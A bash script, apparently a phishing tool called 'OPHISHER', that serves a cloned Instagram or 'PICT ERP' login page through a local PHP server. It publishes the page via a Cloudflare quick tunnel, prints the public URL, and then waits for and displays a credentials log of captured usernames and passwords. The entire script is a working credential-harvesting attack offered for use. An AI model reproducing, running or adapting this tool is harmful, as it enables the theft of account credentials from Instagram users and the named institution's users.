#!/bin/bash

dependencies() {
	if [ -f /usr/bin/php ]; then
		echo ""
	else
		echo "PHP NOT PRESENT PLS INSTALL ON /usr/bin/php"
		exit 1
	fi
	path=$(pwd)
	
	echo " Root path is: $path"
	if [ -f $path/cloudflared-linux-amd64 ]; then
		echo ""
	else
		echo "cloudflare not present please verify path"
		echo -e "\n checked on path: $path"
		exit 1
	fi
	
	echo -e "------------------DEPENDENCIES OK------------------\n"
	
}

localhost_server() {
	echo -e "\nStarting server on port: $port"
	
	cd $path/WEBSITES/$target
	
	php -S localhost:$port &> $path/LOGS/php_server.log &
	
	php_pid=$!
	
	echo -e "\nPHP server pid = $php_pid"

	if [ $? = "0" ]; then
		echo -e "\nServer started on port $port"
		echo -e "\nVisit 127.0.0.1:$port or localhost:$port on browser for PHP SERVER"
	else
		echo "Error opening server check LOGS"
	fi
}

cloudflare_server() {
	
	if [ -f $path/WEBSITES/$target/LOGS/credentials.log ]
	then
		echo -e "\nREMOVING OLD CREDENTIAL LOGS SINCLE FILE EXISTS\n"
		echo -e "DISPLAYING OLD CREDENTIALS\n"
		cat $path/WEBSITES/$target/LOGS/credentials.log
		echo -e "\n"
		rm $path/WEBSITES/$target/LOGS/credentials.log
	fi
	cd $path
	echo -e "\nCREATING CLOUDFLARE TUNNEL\n"
	
	./cloudflared-linux-amd64 tunnel -url localhost:$port > $path/LOGS/cloudflare_tunnel.log 2>&1 &
	
	patterns=(
	  "[ 10"
	  " \u200920 "
	  " \u200930 "
	  " \u200940 "
	  " \u200950 "
	  " \u200960 "
	  " \u200970 "
	  " \u200980 "
	  " \u200990 "
	  " \u2009100 ] "
	)

	for var in ${patterns[@]}
	do
		echo -n -e "$var"
		sleep 1
	done
	
	echo -e "\nTunnel Created SUCCESSFULLY refer to logs if error is found"
	tunnel_pid=$!
	echo -e "\nTunnel PID = $tunnel_pid\n"
	
	if grep -q "https://.*\.trycloudflare\.com" $path/LOGS/cloudflare_tunnel.log
	then
		url=$(grep "https://.*\.trycloudflare\.com" $path/LOGS/cloudflare_tunnel.log)
		echo -e "\nURL present and is:"
		echo -e "\n"
		echo "$url"
		echo -e "\n"
	else
		echo "URL NOT FOUND"
		echo -e "\nEXITTING"
		exit 1
	fi
	
	cd $path/WEBSITES/$target
}

echo -e "\nCHECKING DEPENDENCIES ........."

dependencies

figlet "    OPHISHER"
echo "---------------------------------------------------"
echo -e "\n WELCOME TO OPHISHER PLEASE SELECT TARGET FRONTEND\n"

echo -e "[1] PICT ERP PLATFORM \n"
echo -e "[2] INSTAGRAM \n"
echo -e "[99] EXIT\n"

echo -e -n "\nEnter your option: "
read opt

case $opt in
	1) target=ERP_PICT && cd $path/WEBSITES/ERP_PICT || { echo "Directory not found!"; exit 1; };;
	2) target=INSTAGRAM && cd $path/WEBSITES/INSTAGRAM || { echo "Directory not found!"; exit 1; };;
	99) echo "EXITING" && exit 0;;
	*) echo "INVALID INPUT" && exit 1
esac

echo -n -e "\nEnter port number: "
read port

localhost_server

cloudflare_server

echo -e "\n WAITING FOR CREDENTIALS\n"

while [ ! -f $path/WEBSITES/$target/LOGS/credentials.log ]
do
	sleep 3
done

cat $path/WEBSITES/$target/LOGS/credentials.log

echo -e  "\nPress any key to exit OR Wait for further logs\n"


echo "SERVER PID: $php_pid TUNNEL PID: $tunnel_pid"

echo -e -n "\nENTER ANY KEY TO EXIT"
read var

echo -e "KILLING PROCESSES\n"

kill $php_pid $tunnel_pid
